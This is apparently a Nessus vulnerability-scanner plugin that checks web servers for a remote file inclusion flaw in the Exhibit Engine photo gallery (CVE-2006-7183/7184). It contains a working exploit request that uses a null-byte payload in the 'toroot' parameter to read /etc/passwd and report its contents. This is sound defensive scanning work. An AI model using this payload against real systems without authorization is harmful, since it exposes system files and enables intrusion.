#
#       This script was written by Justin Seitz <jms@bughunter.ca>
#	Per Justin : GPLv2
#
# Changes by Tenable:
# - Revised plugin title, added OSVDB ref (1/02/2009)

include("compat.inc");

if(description)
{
 # set script identifiers

 script_id(23640);
 script_version("$Revision: 1.15 $");

 script_cve_id("CVE-2006-7183", "CVE-2006-7184");
 script_bugtraq_id(20793, 21313);
 script_osvdb_id(34030);

 script_name(english:"Exhibit Engine styles.php toroot Parameter Remote File Inclusion");
 summary["english"] = "Tries to read a local file with Exhibit Engine";
 family["english"] = "CGI abuses";

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
remote file include issue." );
 script_set_attribute(attribute:"description", value:
"The remote web server is running Exhibit Engine, a PHP based photo
gallery management system. 

The version of Exhibit Engine installed on the remote host fails to
sanitize input to the 'toroot' parameter before using it in the
'styles.php' script to include PHP code.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker can
exploit this issue to view arbitrary files and execute arbitrary code,
possibly taken from third-party hosts, on the remote host." );
 script_set_attribute(attribute:"solution", value:
"No patches or upgrades have been reported by the vendor at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/11/14");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/11/26");
 script_cvs_date("$Date: 2011/03/15 19:22:14 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2006-2011 Justin Seitz");

 script_family(english:family["english"]);

 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);

#
# verify we can talk to the web server, if not exit
#

if(!get_port_state(port)) exit(0);
if(!can_host_php(port:port)) exit(0);

#
# create list of directories to scan
#


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/gallery","/photos","/images","/exhibit","/exhibitengine","/ee", cgi_dirs()));
else dirs = make_list(cgi_dirs());
#
# Iterate through the list
#

file = "/etc/passwd";

foreach dir (dirs) {

#
#
#       Attack: Attempt a remote file include of /etc/passwd
#
#
  attackreq = http_get(item:string(dir, "/styles.php?toroot=", file, "%00"),port:port);
  attackres = http_keepalive_send_recv(port:port, data:attackreq, bodyonly:TRUE);
  if (attackres == NULL) exit(0);

  if (egrep(pattern:"root:.*:0:[01]:", string:attackres) ||
    string("main(", file, "\\0styles/original.php): failed to open stream") >< attackres ||
    string("main(", file, "): failed to open stream: No such file") >< attackres ||
    "open_basedir restriction in effect. File(" >< attackres)   {

    passwd = "";
    if (egrep(pattern:"root:.*:0:[01]:", string:attackres))
      passwd = attackres;

    if (passwd) {
      if (dir == "") dir = "/";
      info = string("The version of Exhibit Engine installed in directory '", dir, "'\n",
        "is vulnerable to this issue. Here are the contents of /etc/passwd\n",
        "from the remote host :\n\n", passwd);
      security_warning(port:port, extra: info);
    }
    else
      security_warning(port:port);

    exit(0);
  }
}
